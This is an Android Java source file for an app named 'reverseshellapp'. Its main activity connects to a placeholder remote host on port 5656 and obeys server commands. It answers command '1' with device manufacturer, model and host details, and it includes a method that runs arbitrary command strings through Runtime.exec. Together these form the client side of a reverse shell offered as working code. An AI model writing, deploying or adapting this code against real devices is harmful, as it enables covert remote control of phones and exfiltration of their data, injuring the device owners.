package com.example.reverseshellapp;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private final Connection connection = new Connection();

    ExecutorService executorService = Executors.newSingleThreadExecutor();
    Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        Button connectToHostBtn = findViewById(R.id.connect_btn);
        connectToHostBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            connection.startConnection("IP", 5656);
                            Log.i("Connection", "Connection started");
                            String sendConnectionInfoToServer = connection.printConnetionInfo();
                            connection.sendFromClient(sendConnectionInfoToServer);
                            while (true) {
                                String msgReceivedFromServer = connection.receiveFromServer();
                                Log.i("Received from the server", msgReceivedFromServer);
                                if (msgReceivedFromServer.equals("exit")) {
                                    connection.sendFromClient("Bye!");
                                    connection.stopConnection();
                                    Log.i("Connection", "Connection closed");
                                }
                                if (msgReceivedFromServer.equals("1")) {
                                    connection.sendFromClient(deviceInfo());
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
        });


        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }

    public String executeCommands(String cmd) throws IOException {
        Process process = Runtime.getRuntime().exec(new String[]{cmd});
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        reader.close();
        return output.toString();
    }

    public String deviceInfo() {
        String line = "────୨ৎ────────୨ৎ────────୨ৎ────────୨ৎ────\n";
        line += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
        line += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
        line += "Product: "+android.os.Build.PRODUCT+"\n";
        line += "Model: "+android.os.Build.MODEL+"\n";
        line += "Brand: "+android.os.Build.BRAND+"\n";
        line += "Device: "+android.os.Build.DEVICE+"\n";
        line += "Host: "+android.os.Build.HOST+"\n";
        line += "────୨ৎ────────୨ৎ────────୨ৎ────────୨ৎ────\n";
        return line;
    }
}
